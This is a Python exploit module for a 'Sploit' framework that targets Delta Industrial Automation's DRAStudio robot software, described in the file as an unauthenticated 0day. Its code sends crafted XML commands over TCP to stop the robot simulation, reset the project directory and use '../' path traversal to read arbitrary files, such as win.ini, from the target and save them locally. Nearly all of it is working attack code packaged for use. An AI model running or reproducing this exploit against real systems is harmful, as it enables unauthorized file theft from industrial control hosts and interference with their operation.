#!/usr/bin/env python

import socket
import struct

from collections import OrderedDict
from Sploit import Sploit

INFO = {}
INFO['NAME'] = 'efs_DELTA_IA_Robot_DRAstudio_afd'
INFO['DESCRIPTION'] = 'Delta Industrial Automation Robot DRAStudio Arbitrary File Disclosure'
INFO['VENDOR'] = 'http://www.deltaww.com'
INFO['CVE Name'] = '0day'
INFO['DOWNLOAD_LINK'] = 'http://www.deltaww.com/services/DownloadCenter2.aspx?secID=8&pid=2&tid=0&CID=06&itemID=060601&typeID=1&downloadID=&title=&dataType=1;8;3;9;10;&check=1&hl=en-US'
INFO['LINKS'] = []
INFO['CHANGELOG'] = '29 Jun 2018'
INFO['PATH'] = 'General/'
INFO['NOTES'] = """Special crafted TCP packet to VRCInitiate.exe allows to disclose arbitrary files using '../' combination. 
Authentication is not required.
Tested against DRAStudio 1.00.02 on Windows 7 SP1 x64.
"""

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.0.14'
OPTIONS['PORT'] = 8000
OPTIONS['FILENAME'] = 'windows/win.ini'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = self.args.get('PORT', OPTIONS['PORT'])
        self.filename = self.args.get('FILENAME', OPTIONS['FILENAME'])

    def send_command(self, cmd, get_set, *args):
        arguments = '<par1>' + get_set + '</par1>' + ''.join(
            ('<par%s>%s</par%s>' % (i + 2, arg, i + 2)) for i, arg in enumerate(args))
        data = '<Cmds><Cmd name="%s">%s</Cmd></Cmds>' % (cmd, arguments)
        self.s.send(data)
        data = self.s.recv(6000000)
        print repr(data)
        return data

    def run(self):
        #Get options from gui
        self.args()
        self.log('[*] Checking connection to %s:%s' % (self.host, self.port))
        s = socket.socket()
        s.connect((self.host, self.port))
        self.s = s
        self.send_command('PROJ', 'SET', 'STOP', 'CYCLE_STOP')  # STOP simulation
        self.send_command('PROJ', 'SET', '')  # set new project dir
        filename, ext = self.filename.rsplit('.', 1)
        data = self.send_command('FILE', 'GET', '../' * 8 + filename, ext)  # file read
        data = data.split(self.filename+':')[1]
        if len(data) < 10000:
            self.log('[+]\r\n' + data)
        self.writefile(data, self.filename.replace('\\', '/').split('/').pop())
        self.finish(True)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()